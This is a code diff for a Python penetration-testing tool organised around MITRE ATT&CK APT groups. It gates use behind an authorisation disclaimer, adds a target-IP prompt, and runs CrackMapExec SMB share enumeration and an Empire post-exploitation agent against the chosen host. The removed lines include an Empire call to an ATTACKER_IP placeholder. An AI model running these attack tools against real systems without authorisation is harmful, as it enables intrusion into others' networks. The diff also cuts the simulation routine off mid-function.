@@ -22,11 +22,11 @@ def display_disclaimer():
     
     By using this tool, you acknowledge and agree that:
     - You have explicit permission to conduct penetration tests on the target systems.
-    - You will not use this tool for unauthorised access or malicious activities.
+    - You will not use this tool for unauthorized access or malicious activities.
     - You understand the potential risks involved in executing real penetration tests, including system disruption or data loss.
-    - The authors of this tool is not responsible for any damage or legal consequences resulting from its use.
+    - The authors of this tool are not responsible for any damage or legal consequences resulting from its use.
     
-    Proceeding without proper authorisation is illegal and unethical. Do you acknowledge and accept these terms? (y/n)
+    Proceeding without proper authorization is illegal and unethical. Do you acknowledge and accept these terms? (y/n)
     """)
 
     response = input("Enter 'y' to accept or 'n' to decline: ").lower()
@@ -115,19 +115,22 @@ def generate_html_report(apt_group, techniques):
         report_file.write("</ul></body></html>")
     print(f"[INFO] Report generated: {apt_group}_report.html")
 
-# Execute penetration testing attack (using CrackMapExec or Empire)
-def execute_attack_tool(group, technique):
-    """Execute real attack tools (e.g., CrackMapExec, Empire) based on selected group and technique."""
-    print(f"[INFO] Executing attack using {technique} for APT Group: {group}...")
-    
-    if 'CrackMapExec' in technique:
-        # Example of running CrackMapExec (adjust based on technique)
-        subprocess.run(['crackmapexec', 'smb', 'TARGET_IP', '--shares'])
-    elif 'Empire' in technique:
-        # Example of running Empire (adjust based on technique)
-        subprocess.run(['empire', '--agent', 'ATTACKER_IP', '--target', 'TARGET_IP'])
-    else:
-        print(f"[ERROR] No matching tool for technique: {technique}")
+# Select IP address for target
+def select_target_ip():
+    """Prompt the user for a target IP address."""
+    target_ip = input("Enter the target IP address: ")
+    print(f"[INFO] Target IP selected: {target_ip}")
+    return target_ip
+
+# Execute CrackMapExec for SMB attacks
+def run_crackmapexec(target_ip):
+    print(f"[INFO] Running CrackMapExec against {target_ip}...")
+    subprocess.run(['crackmapexec', 'smb', target_ip, '--shares'])
+
+# Execute Empire for post-exploitation
+def run_empire(target_ip):
+    print(f"[INFO] Running Empire agent against {target_ip}...")
+    subprocess.run(['empire', '--agent', target_ip, '--target', target_ip])
 
 # Penetration testing mode function
 def run_penetration_testing():
@@ -135,7 +138,10 @@ def run_penetration_testing():
     # Ensure tools are installed
     check_tool_installed('crackmapexec', 'pip install crackmapexec')
     check_tool_installed('empire', 'pip install empire')
-    
+
+    # Select target IP for attack
+    target_ip = select_target_ip()
+
     # Select APT group and techniques for attack
     apt_groups = display_apt_groups(data)
     apt_group_selection = int(input(f"\nEnter selection (1-{len(apt_groups)}): "))
@@ -150,7 +156,14 @@ def run_penetration_testing():
             break
         selected_technique = techniques[technique_selection - 1]
         selected_techniques.append(selected_technique)
-        execute_attack_tool(selected_group, selected_technique)
+        
+        # Execute attack tools (CrackMapExec, Empire)
+        if 'SMB' in selected_technique:
+            run_crackmapexec(target_ip)
+        elif 'Empire' in selected_technique:
+            run_empire(target_ip)
+        else:
+            print(f"[ERROR] No matching tool for technique: {selected_technique}")
 
     # Report Generation (same as simulation)
     report_format = input("Generate report in text or HTML format? (text/html): ").lower()
@@ -181,30 +194,4 @@ def select_mode():
 # Simulation Mode function
 def run_simulation():
     """Run the MITRE ATT&CK simulation."""
-    # Step 1: Check if ATT&CK data exists or download it
-    if not os.path.exists('attack_data.json'):
-        print("[INFO] ATT&CK data not found. Downloading...")
-        download_attack_data()
-    data = load_attack_data()  # Load the ATT&CK dataset
-
-    # Step 2: Display available APT groups and let user select
-    apt_groups = display_apt_groups(data)
-    apt_group_selection = int(input(f"\nEnter selection (1-{len(apt_groups)}): "))
-    selected_group = apt_groups[apt_group_selection - 1]
-    print(f"[INFO] You selected: {selected_group}")
-
-    # Step 3: Display techniques for the selected APT group
-    techniques = display_techniques(data, selected_group)
-    selected_techniques = []
-    while True:
-        technique_selection = int(input(f"\nSelect a technique (1-{len(techniques)}), or 0 to finish: "))
-        if technique_selection == 0:
-            break
-        selected_technique = techniques[technique_selection - 1]
-        selected_techniques.append(selected_technique)
-        simulate_technique(selected_group, selected_technique)
-
-    # Step 4: Report Generation
-    report_format = input("Generate report in text or HTML format? (text/html): ").lower()
-    if report_format == 'text':
-        generate_text_report(selected_group,
+    #
